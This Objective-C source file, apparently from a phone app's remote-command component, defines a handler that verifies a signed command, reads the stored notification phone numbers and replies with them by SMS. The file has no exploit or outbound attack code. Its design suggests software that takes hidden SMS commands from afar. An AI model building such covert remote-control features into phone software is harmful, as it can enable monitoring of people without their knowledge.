/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryNotificationNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryNotificationNumbersProcessor.h"
#import "PrefNotificationNumber.h"
#import "Preference.h"

@interface QueryNotificationNumbersProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryNotificationNumber;
@end

@implementation QueryNotificationNumbersProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryNotificationNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(QueryNotificationNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryNotificationNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryNotificationNumbersProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryNotificationNumbersProcessor--->doProcessingCommand")
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"QueryNotificationNumbersProcessor"
												  reason:@"Failed signature check"];
	}
	
    [self processQueryNotificationNumber];
}

#pragma mark QueryNotificationNumbersProcessor  PrivateAPI

/**
 - Method name: processQueryNotificationNumber
 - Purpose:This method is used to process query notification number
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processQueryNotificationNumber {
	DLog (@"QueryNotificationNumbersProcessor--->processQueryNotificationNumber")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	NSArray *notificationNumberList=[prefNotificationNumberList mNotificationNumbers];
	NSString *result=NSLocalizedString(@"kQueryNotificationNumber", @"");
	for (NSString *notificationNumber in notificationNumberList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:notificationNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryNotificationNumbersProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryNotificationMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryNotificationMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryNotificationMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
